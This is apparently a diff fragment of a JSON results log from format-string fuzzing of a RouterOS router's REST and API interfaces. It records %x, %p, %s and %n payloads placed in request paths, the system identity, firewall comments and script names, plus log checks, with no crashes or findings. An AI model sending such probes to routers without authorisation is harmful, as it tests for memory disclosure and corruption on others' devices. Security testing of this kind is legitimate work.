+      "description": "GET /rest/system/script/%p%p%p%p -- trigger error logging with fmt specifiers",
+      "result": "HTTP 500, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:16.687950",
+      "details": {
+        "name": "get_fmtstr_path",
+        "method": "GET",
+        "path": "/system/script/%p%p%p%p",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 109,
+      "category": "fmtstr_error_trigger",
+      "name": "error trigger: patch_fmtstr_id",
+      "description": "PATCH /rest/ip/firewall/filter/%08x%08x%08x%08x -- trigger error logging with fmt specifiers",
+      "result": "HTTP 500, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:17.003792",
+      "details": {
+        "name": "patch_fmtstr_id",
+        "method": "PATCH",
+        "path": "/ip/firewall/filter/%08x%08x%08x%08x",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 110,
+      "category": "fmtstr_error_trigger",
+      "name": "error trigger: post_fmtstr_path",
+      "description": "POST /rest/%s%s%s%s/invalid -- trigger error logging with fmt specifiers",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:17.315636",
+      "details": {
+        "name": "post_fmtstr_path",
+        "method": "POST",
+        "path": "/%s%s%s%s/invalid",
+        "status": 400,
+        "response": "{'detail': 'no such command or directory (%25s%25s%25s%25s)', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 111,
+      "category": "fmtstr_log_analysis",
+      "name": "log analysis: literal format strings",
+      "description": "Check if format specifiers appear literally in router logs",
+      "result": "Found 13 entries with literal format specifiers",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:25.751416",
+      "details": {
+        "literal_fmtstr_count": 13,
+        "sample_entries": [
+          "{'.id': '*504', 'extra-info': '', 'message': 'changed system note settings by api:admin@:: (/system note set note=%x%x%x%x%x%x%x%x)', 'time': '2026-02-16 21:50:44', 'topics': 'system,info'}",
+          "{'.id': '*505', 'extra-info': '', 'message': 'changed system note settings by api:admin@:: (/system note set note=%p%p%p%p%p%p%p%p)', 'time': '2026-02-16 21:50:44', 'topics': 'system,info'}",
+          "{'.id': '*506', 'extra-info': '', 'message': 'changed system note settings by api:admin@:: (/system note set note=%08x.%08x.%08x.%08x)', 'time': '2026-02-16 21:50:44', 'topics': 'system,info'}",
+          "{'.id': '*55F', 'extra-info': 'app=ftp duser=%x.%x.%x.%x outcome=failure src=[REDACTED-INTERNAL-IP] ', 'message': 'login failure for user %x.%x.%x.%x from [REDACTED-INTERNAL-IP] via ftp', 'time': '2026-02-16 22:47:46', 'topi... [truncated, total 229 chars]",
+          "{'.id': '*560', 'extra-info': 'app=ftp duser=%n%n%n%n outcome=failure src=[REDACTED-INTERNAL-IP] ', 'message': 'login failure for user %n%n%n%n from [REDACTED-INTERNAL-IP] via ftp', 'time': '2026-02-16 22:47:48', 'topics': '... [truncated, total 223 chars]"
+        ]
+      }
+    },
+    {
+      "id": 112,
+      "category": "fmtstr_log_analysis",
+      "name": "log analysis: format string expansion",
+      "description": "Check if format specifiers were expanded to hex values in logs",
+      "result": "Found 0 entries with possible hex expansion",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:25.751416",
+      "details": {
+        "expanded_count": 0,
+        "expanded_entries": []
+      }
+    },
+    {
+      "id": 113,
+      "category": "fmtstr_identity",
+      "name": "identity fmtstr: identity_hex",
+      "description": "Set system identity to format string: %x%x%x%x%x%x%x%x",
+      "result": "HTTP 200, crashed=False, readback='%x%x%x%x%x%x%x%x', processed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:26.271156",
+      "details": {
+        "payload": "%x%x%x%x%x%x%x%x",
+        "status": 200,
+        "response": "",
+        "crashed": false,
+        "readback": "%x%x%x%x%x%x%x%x",
+        "processed": false,
+        "pre_uptime": "3h17m3s",
+        "post_uptime": "3h17m4s"
+      }
+    },
+    {
+      "id": 114,
+      "category": "fmtstr_identity",
+      "name": "identity fmtstr: identity_ptr",
+      "description": "Set system identity to format string: %p%p%p%p%p%p%p%p",
+      "result": "HTTP 200, crashed=False, readback='%p%p%p%p%p%p%p%p', processed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:27.086828",
+      "details": {
+        "payload": "%p%p%p%p%p%p%p%p",
+        "status": 200,
+        "response": "",
+        "crashed": false,
+        "readback": "%p%p%p%p%p%p%p%p",
+        "processed": false,
+        "pre_uptime": "3h17m4s",
+        "post_uptime": "3h17m5s"
+      }
+    },
+    {
+      "id": 115,
+      "category": "fmtstr_identity",
+      "name": "identity fmtstr: identity_str",
+      "description": "Set system identity to format string: %s%s%s%s",
+      "result": "HTTP 200, crashed=False, readback='%s%s%s%s', processed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:27.895232",
+      "details": {
+        "payload": "%s%s%s%s",
+        "status": 200,
+        "response": "",
+        "crashed": false,
+        "readback": "%s%s%s%s",
+        "processed": false,
+        "pre_uptime": "3h17m5s",
+        "post_uptime": "3h17m5s"
+      }
+    },
+    {
+      "id": 116,
+      "category": "fmtstr_identity",
+      "name": "identity fmtstr: identity_write_n",
+      "description": "Set system identity to format string: %n%n%n%n",
+      "result": "HTTP 200, crashed=False, readback='%n%n%n%n', processed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:38.648606",
+      "details": {
+        "payload": "%n%n%n%n",
+        "status": 200,
+        "response": "",
+        "crashed": false,
+        "readback": "%n%n%n%n",
+        "processed": false,
+        "pre_uptime": "3h17m6s",
+        "post_uptime": "3h17m16s"
+      }
+    },
+    {
+      "id": 117,
+      "category": "fmtstr_api",
+      "name": "API format string: api_cmd_hex",
+      "description": "Send format specifiers via RouterOS API protocol",
+      "result": "Response: ['!done'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:38.964764",
+      "details": {
+        "name": "api_cmd_hex",
+        "words": [
+          "/system/identity/set",
+          "=name=%x%x%x%x"
+        ],
+        "result": "Response: ['!done']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 118,
+      "category": "fmtstr_api",
+      "name": "API format string: api_cmd_ptr",
+      "description": "Send format specifiers via RouterOS API protocol",
+      "result": "Response: ['!done'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:39.280922",
+      "details": {
+        "name": "api_cmd_ptr",
+        "words": [
+          "/system/identity/set",
+          "=name=%p%p%p%p"
+        ],
+        "result": "Response: ['!done']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 119,
+      "category": "fmtstr_api",
+      "name": "API format string: api_comment_hex",
+      "description": "Send format specifiers via RouterOS API protocol",
+      "result": "Response: ['!done', '=ret=*6'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:39.593078",
+      "details": {
+        "name": "api_comment_hex",
+        "words": [
+          "/ip/firewall/filter/add",
+          "=chain=forward",
+          "=action=accept",
+          "=comment=%08x.%08x.%08x.%08x"
+        ],
+        "result": "Response: ['!done', '=ret=*6']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 120,
+      "category": "fmtstr_api",
+      "name": "API format string: api_script_hex",
+      "description": "Send format specifiers via RouterOS API protocol",
+      "result": "Response: ['!done', '=ret=*11'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:39.909236",
+      "details": {
+        "name": "api_script_hex",
+        "words": [
+          "/system/script/add",
+          "=name=_apifmt_%x%x",
+          "=source=:log info test"
+        ],
+        "result": "Response: ['!done', '=ret=*11']",
+        "crashed": false
+      }
+    }
+  ],
+  "findings": []
+}
